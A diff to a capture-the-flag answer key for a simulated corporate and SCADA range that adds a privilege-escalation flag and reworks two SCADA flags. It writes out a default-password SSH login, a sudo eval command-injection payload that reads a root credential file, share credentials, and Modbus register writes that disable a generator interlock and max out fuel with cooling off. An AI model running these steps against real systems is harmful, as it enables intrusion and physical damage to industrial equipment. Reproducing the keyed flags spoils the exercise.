@@ -188,31 +188,59 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 
 ---
 
-## SCADA pivot (applies to flags 18 + 19)
+## Flag 37 — Ops Engineer Workstation Privilege Escalation (Hard, 200pts)
 
-The SCADA HMI sits on VLAN 40 (`172.20.40.0/24`) and is **not directly reachable from Kali**. Per the docker-compose topology, `a3-intranet` is the only Front Office container that bridges `corporate` + `scada` + `lab`, so it is the canonical pivot host.
+This flag is the **gate for flags 18 and 19.** A15 (`ops-eng01.boreas.local`, 172.20.10.50) is the only Front Office asset with a network route onto VLAN 40 (SCADA). Without rooting A15 and reading the HMI credential cache, there is no way to reach `scada-gw.boreas.local` and no way to fire the collective gate.
 
-**For testing** — bypass the pivot by exec'ing straight onto A3 (or A5) and running the commands from there:
-```
-sudo docker exec -it a3-intranet /bin/bash
-# a3-intranet has python3 + postgresql-client; install pymodbus if you need flag 19:
-pip install pymodbus
-```
-For a real exploitation path a participant would need to gain code execution on A3 first (the Flask `/search` endpoint is SQLi-vulnerable, and the wiki renderer uses `render_template_string` — SSTI is in scope) and then run a socat/python TCP forwarder, but those steps are outside the flag 18/19 objectives themselves.
+1. **Discover Sergei Ivanov (OSINT).** On the A0 `/leadership.html` page, scroll past the three executives — the "Department Leads" block names Sergei Ivanov as "Operations Engineer — Plant Systems" with email `s.ivanov@boreas-systems.ctf`. Cross-reference with the A4 HR share `org_chart_current.xlsx` (flag 9 path, uses `m.webb / Welcome1`): Ivanov appears as "Ops Engineer — Plant Systems", reports to Webb, note "Generator + SCADA on-call".
+
+2. **Get Ivanov's password.** The A3 intranet HR wiki already tells you that the corporate default is `Welcome1` and that several employees never rotated (same clue that powers flag 9 / flag 10). Confirmation: log into Roundcube at `http://mail.boreas.local` as `s.ivanov` / `Welcome1` — the HR "Welcome back — account reset complete" mail in his inbox explicitly sets the password back to the corporate default on return from leave. The second mail thread in the same inbox (`02_scada_creds_ping.eml` + reply) hints that the SCADA creds live on root's side of A15 under `/root/.scada/`.
+
+3. **SSH into A15 as Ivanov.**
+   ```
+   sshpass -p Welcome1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null s.ivanov@ops-eng01.boreas.local
+   ```
+   Check `.bash_history` and `notes.txt` once inside — both reinforce the sudo chain and the root-side loot location.
+
+4. **Enumerate the sudo rule.**
+   ```
+   sudo -l
+   ```
+   Exactly one rule: `s.ivanov ALL=(root) NOPASSWD: /opt/ops/scada_diag.sh`
+
+5. **Exploit the sudo-arg-injection sink.** `/opt/ops/scada_diag.sh` builds `CMD="curl -sS --max-time 5 http://$HOST:8080/ping"` and `eval`s it, so shell metacharacters in the hostname get re-parsed and run as root. The trailing `#` is essential — without it, `eval` sees `curl ... http://x; cat /root/.scada/hmi.json:8080/ping` and cat tries to read the concatenated filename. With the `#`, the `:8080/ping` token becomes a comment and `cat` runs cleanly:
+   ```
+   sudo /opt/ops/scada_diag.sh --host "x; cat /root/.scada/hmi.json #"
+   ```
+   The `cat` runs as root and streams the file contents back through the script's output.
+
+6. **Read the loot.** `/root/.scada/hmi.json` contains the SCADA HMI credentials and the flag:
+   ```json
+   {
+     "target": "scada-gw.boreas.local",
+     "username": "svc-scada",
+     "password": "Sc@da#2025!",
+     "flag": "FLAG{5c3e7a9f1b8d4602}",
+     ...
+   }
+   ```
+
+**Expected flag:** `FLAG{5c3e7a9f1b8d4602}`
+
+**Keep the A15 SSH session open.** Flags 18 and 19 both execute from inside this shell — A15 is the only Front Office host that can reach `scada-gw.boreas.local`, and `pymodbus` is preinstalled there.
 
 ---
 
 ## Flag 18 — SCADA Interface Discovered (Hard, 200pts)
 
-1. The SCADA HMI is on VLAN 40, not directly reachable. Discover its hostname from one of:
-   - The IT share network diagram (VLAN 40: `scada-gw.boreas.local`)
-   - Kowalski's email about isolating the SCADA on VLAN 40
-   - The A3 intranet IT Knowledge Base page
-2. Pivot through A3 (see the SCADA pivot section above). From A3:
+**Prerequisite:** Flag 37 complete — you are sitting in the A15 SSH session as `s.ivanov`.
+
+1. The SCADA HMI hostname is `scada-gw.boreas.local`. If you haven't identified the host yet, it's also listed in the A4 IT share network diagram (flag 19 chain) and in the A3 intranet IT Knowledge Base. The A15 Ops Telemetry dashboard you can curl at `http://ops-eng01.boreas.local/` also names it in its footer text.
+2. From inside the A15 shell, fetch the HMI monitoring dashboard:
    ```
-   python3 -c "import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode())" | head -60
+   python3 -c "import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode())" | head -80
    ```
-3. The HMI monitoring dashboard at `http://scada-gw.boreas.local:8080` requires no auth for monitoring.
+3. The monitoring dashboard requires no authentication. Control functions require svc-scada, but the monitoring page is what carries flag 18.
 4. The flag is in the **page footer** as "S/N: FLAG{...}".
 
 **Expected flag:** `FLAG{1d4e7b0a3c9f8265}`
@@ -221,22 +249,21 @@ For a real exploitation path a participant would need to gain code execution on 
 
 ## Flag 19 — Generator SCADA Override / Collective Gate (Expert, 300pts)
 
-1. Access the SCADA HMI architecture page at `/architecture`. It reveals:
-   - A Modbus PLC on port 502 controls the hardware interlock
-   - The interlock must be bypassed via raw Modbus before the HMI controls work
-2. Pivot through A3 (see the SCADA pivot section above) to reach `scada-gw.boreas.local` on both `:8080` (HMI) and `:502` (Modbus).
-3. Authenticate to the HMI control panel with `svc-scada` credentials. Discovery path: the IT share on A4 contains `service_account_vault.pdf` (Kowalski's "do not email" cred sheet) — the `svc-scada` row has `Sc@da#2025!`. You need IT-share read access, which the `svc-fileshare` service account from flag 15 (Kowalski's "creds backup" email on A1) provides:
+**Prerequisite:** Flag 37 complete — you are sitting in the A15 SSH session as `s.ivanov`, and you have the `svc-scada / Sc@da#2025!` cred from the `hmi.json` loot.
+
+1. Fetch the SCADA HMI architecture page from inside the A15 shell:
    ```
-   smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!" -c "get service_account_vault.pdf"
-   pdf2txt.py service_account_vault.pdf | grep -iE 'svc-scada|Sc@da'
+   python3 -c "import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/architecture').read().decode())"
    ```
-   (The `svc-scada` Kerberos hash on A2 is not rockyou-crackable — the IT share is the intended path.)
-4. The maintenance key `7734` is documented in `generator_maintenance_manual.pdf` on the same IT share — it's the NV-3200 vendor's bypass procedure for the thermal-loop interlock. Download and read:
+   It reveals that a Modbus PLC on port 502 controls the hardware interlock, and that the interlock must be bypassed via raw Modbus before the HMI controls will do anything.
+2. The HMI control panel credentials (`svc-scada / Sc@da#2025!`) came from `/root/.scada/hmi.json` in flag 37. No further cred discovery is needed.
+3. The maintenance key `7734` is documented in `generator_maintenance_manual.pdf` on the A4 IT share — it's the NV-3200 vendor's bypass procedure for the thermal-loop interlock. You need IT-share read access, which the `svc-fileshare` service account from flag 15 (Kowalski's "creds backup" email on A1) provides. Pull the manual on **Kali** (the A15 shell has no `smbclient`), read the key, then continue in the A15 shell:
    ```
+   # from inside a14-kali
    smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!" -c "get generator_maintenance_manual.pdf"
    pdf2txt.py generator_maintenance_manual.pdf | grep -E '7734|register 100|MAINT_KEY'
    ```
-5. Use a Modbus client to bypass the interlock (from the pivot host — e.g., inside a3-intranet after `pip install pymodbus`):
+4. Back in the A15 shell, use `pymodbus` (preinstalled on A15) to clear the interlock:
    ```python
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient("scada-gw.boreas.local", port=502)
@@ -244,13 +271,16 @@ For a real exploitation path a participant would need to gain code execution on 
    c.write_register(address=200, value=7734)  # maintenance key
    c.write_register(address=100, value=0)      # disable interlock
    ```
-6. With interlock bypassed, set fuel injection to 100% and cooling to 0%:
+5. With the interlock bypassed, set fuel injection to 100% and cooling to 0%:
    ```python
    c.write_register(address=10, value=100)  # fuel 100%
    c.write_register(address=11, value=0)    # cooling 0%
    ```
-7. Wait ~12 seconds. The HMI shows temperature climbing to CRITICAL.
-8. The flag appears on the "CRITICAL FAILURE" screen on the web dashboard.
-9. **This is the collective gate** — it opens the Bunker for all participants.
+6. Wait ~12 seconds. The HMI shows temperature climbing to CRITICAL.
+7. Fetch the HMI root page from the A15 shell to see the CRITICAL FAILURE screen with the flag:
+   ```
+   python3 -c "import urllib.request, re; html = urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode(); print(re.search(r'FLAG\{[^}]+\}', html).group(0))"
+   ```
+8. **This is the collective gate** — narratively, it opens the Bunker for all participants. In this range the `splice-link` network is pre-wired so A9 is already reachable from Kali regardless of gate state; the flag 19 firing is a narrative beat, not a runtime topology change.
 
 **Expected flag:** `FLAG{a7f2c8d0e5b34169}`
